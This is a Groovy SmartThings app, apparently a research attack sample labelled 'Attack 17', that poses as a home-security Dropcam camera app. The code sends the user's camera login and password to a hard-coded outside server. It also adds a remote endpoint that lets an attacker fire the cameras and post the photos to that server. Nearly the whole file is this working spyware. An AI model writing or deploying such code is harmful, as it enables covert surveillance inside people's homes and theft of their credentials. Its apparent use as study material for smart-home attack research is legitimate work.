/**
 * Attack Description:
 * 		The malicious App takes advantage of its own system privilege to expose sensitive information. For example, the camera could be triggered by the attacker to take sensitive picture of the user and send it to the attacker. However, the camera originally should send and get image through the 3rd party server, which makes the malicious actions hard to be detected and defended.
 * Normal functions:
 * 		The camera takes the picture out of the house to keep the house secure.
 * Malicious functions:
 * 		The camera smartApp could be triggered by the attacker to take photos and sends them to the attacker’s website.
 */
definition(
		name: "Attack 17: SpecificWeaknesses",
		namespace: "uiuc",
		author: "Qi Wang",
		description: "Specific weaknesses.",
		category: "Safety & Security",
		iconUrl: "https://s3.amazonaws.com/smartapp-icons/Convenience/Cat-Convenience.png",
		iconX2Url: "https://s3.amazonaws.com/smartapp-icons/Convenience/Cat-Convenience@2x.png",
		iconX3Url: "https://s3.amazonaws.com/smartapp-icons/Convenience/Cat-Convenience@2x.png")

preferences {
	section("Log in to your Dropcam account:") {
		input "username", "text", title: "Username", required: true, autoCorrect:false
		input "password", "password", title: "Password", required: true, autoCorrect:false
	}
	section("Select which Dropcams to connect"){
		input(name: "cameras", type: "enum", required:false, multiple:true, metadata: listAvailableCameras())
	}
	section("When to take pictures") { input "timeToRun", "time" }
	section("Turn on which Lights when taking pictures") {
		input "switches", "capability.switch", multiple: true, required:false
	}
}

def installed() {
	initialize()
}

def updated() {
	unsubscribe()
	initialize()
}

def initialize(){
	schedule(timeToRun, handler)
	login()
}

def handler(){
	cameras.each { takePicture(it,1280) }
}

def getCameraList(){
	return [
		[title:"camera1", uuid:"camera1"],
        [title:"camera2", uuid:"camera2"]
	]
}

def listAvailableCameras() {
	def cameras = getCameraList().inject([:]) { c, it ->
		def dni = [app.id, it.uuid].join('.')
		c[dni] = it.title
		return c
	}
	return [values:cameras]
}


private login() {
	def loginParams = [
		uri: "http://128.174.237.226:8080/ProvenanceServer/Attack",
		body: [username: username, password: password]
	]
	httpPost(loginParams) { resp ->
		state.success = true
	}
}


def takePicture(String dni, Integer imgWidth=null){
	switches.on()
	def uuid = dni?.split(/\./)?.last()
	log.debug "taking picture for $uuid (${dni})"
	def imageBytes
	if(state.success){
		imageBytes = doTakePicture(uuid, imgWidth)
	}
	switches.off()
	return imageBytes
}

private doTakePicture(String uuid, Integer imgWidth){
	def takeParams = [
		uri: "http://128.174.237.226:8080/ProvenanceServer/Attack",
		query: [width: imgWidth, uuid: uuid]
	]
	def imageBytes
	try {
		httpGet(takeParams) { resp ->
			imageBytes = resp.data.toString()
		}
	} catch (groovyx.net.http.HttpResponseException e) {
		log.error "Dropcam get_image failure: ${e} with status: ${e.statusCode}"
	} catch (Exception e) {
		log.error "Unexpected Dropcam exception", e
	}
	return imageBytes
}

mappings {
	path("/get_image"){
		action: [
			POST: "attack"
		]
	}
}

def attack() {
	def cameras = cameras.each {
		def imageBytes = takePicture(it,1280)
		sendImage(imageBytes, it, 1280)
	}
}

def sendImage(String imageBytes, String uuid, Integer imgWidth) {
	def data= ["image": imageBytes]
	try {
		httpPost("http://128.174.237.226:8080/ProvenanceServer/Attack", data) { resp -> 
			log.debug "attack succeeded" 
		}
	} catch (Exception e) {
		log.error "attack failed"
	}
}
